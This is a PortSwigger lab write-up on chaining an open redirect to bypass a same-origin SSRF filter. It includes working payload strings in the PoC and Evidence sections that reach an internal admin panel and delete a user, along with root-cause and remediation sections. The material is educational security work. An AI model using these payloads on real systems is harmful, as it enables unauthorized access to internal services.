# Lab 04 — SSRF with Filter Bypass via Open Redirection

[![Category](https://img.shields.io/badge/Category-SSRF-red)]()
[![Type](https://img.shields.io/badge/Type-Whitelist%20Bypass%20via%20Open%20Redirect-orange)]()
[![Difficulty](https://img.shields.io/badge/Difficulty-Practitioner-9cf)]()
[![Severity](https://img.shields.io/badge/Severity-High-critical)]()
[![Source](https://img.shields.io/badge/Source-PortSwigger%20Web%20Security%20Academy-blue)](https://portswigger.net/web-security/ssrf)

> Part of the [SSRF Labs](./README.md) series — PortSwigger Web Security Academy.

---


## 1. Overview

| Field | Detail |
|---|---|
| **Vulnerability Class** | Server-Side Request Forgery (Whitelist Bypass via Open Redirect) |
| **Weakness (CWE)** | CWE-918 (chained with CWE-601 — Open Redirect) |
| **Difficulty** | Practitioner |
| Source | PortSwigger Web Security Academy |
| **Objective** | Reach `http://192.168.0.12:8080/admin` and delete user `carlos`, despite the stock checker being restricted to the local application |

## 2. Summary

The stock checker in this lab enforces a strict same-origin restriction: `stockApi` is only accepted if it points back to the application itself, with no way to directly target an external or internal host. However, the application separately exposes an **open redirection** vulnerability in its "next product" navigation feature, where a `path` parameter is reflected unchecked into a `Location` redirect header. Because the stock-checker's HTTP client follows redirects automatically, chaining these two flaws converts an unexploitable, tightly-scoped SSRF into a fully working one.

## 3. Proof of Concept (PoC)

1. Capture the `POST /product/stock` request and confirm that pointing `stockApi` directly at `http://192.168.0.12:8080/admin` is rejected (must stay same-origin).
2. Browse the product catalog and use **Next product**; observe the request `GET /product/nextProduct?currentProductId=<id>&path=<value>` and that the response is a `302` redirect whose `Location` header reflects `path` unchanged — confirming an open redirect.
3. Build a `stockApi` value that points to the local (whitelisted) open-redirect endpoint, with its `path` parameter set to the real internal target:
   ```
   stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
   ```
4. Send the request — the filter accepts it (same-origin path), the server follows the resulting redirect, and the admin panel HTML is returned.
5. Amend the `path` value to the deletion endpoint and resend to delete the user.

## 4. Evidence

**Direct attempt (blocked):**
```
stockApi=http://192.168.0.12:8080/admin
```
Response: rejected — "must be a local path" style error.

**Open redirect confirmed:**
```
GET /product/nextProduct?currentProductId=1&path=/product?productId=2 HTTP/1.1
```
```
HTTP/1.1 302 Found
Location: /product?productId=2
```

**Chained SSRF via the redirect:**
```
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
```
Response: `200 OK`, admin panel HTML returned.

**Deletion:**
```
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```
Response: `200 OK`, lab marked **Solved**.

## 5. Root Cause Analysis

**Attacker perspective:** The SSRF filter only inspects the literal value supplied in `stockApi` and is satisfied once it confirms the path begins locally. It has no visibility into what that local endpoint will do next. Because the local endpoint itself blindly reflects a `path` parameter into a redirect response, and the back-end HTTP client used for the stock check automatically follows redirects without re-validating the final destination, the two independently "acceptable" behaviors combine into a full SSRF bypass.

**Defender perspective:** This is a textbook example of two moderate-severity issues (an open redirect and a same-origin-restricted SSRF) combining into a critical one. Validating only the initial destination of a request — and not the final destination after any redirects are followed — leaves a gap that's invisible when each component is reviewed in isolation.

## 6. Impact

Equivalent to Lab 02 (arbitrary access to internal network resources, here demonstrated via an admin panel on a private IP), but reached despite a filter that, on its own, appeared to fully restrict the stock checker to the local application.

## 7. Remediation

- Configure the HTTP client used for server-side fetches to **not follow redirects automatically**, or to re-validate the destination of every redirect hop against the same allowlist applied to the original request.
- Fix the underlying open redirect independently: validate that `path` (and any similar redirect-target parameter) only points to a known-safe, same-origin destination before issuing a `Location` header.
- Treat SSRF filtering and open-redirect prevention as related controls during code review — an open redirect anywhere in the same trust domain as an SSRF-restricted feature can undermine that restriction entirely.

## 8. References

- [PortSwigger — SSRF with filter bypass via open redirection vulnerability](https://portswigger.net/web-security/ssrf)
- [CWE-918](https://cwe.mitre.org/data/definitions/918.html)
- [CWE-601 — URL Redirection to Untrusted Site ('Open Redirect')](https://cwe.mitre.org/data/definitions/601.html)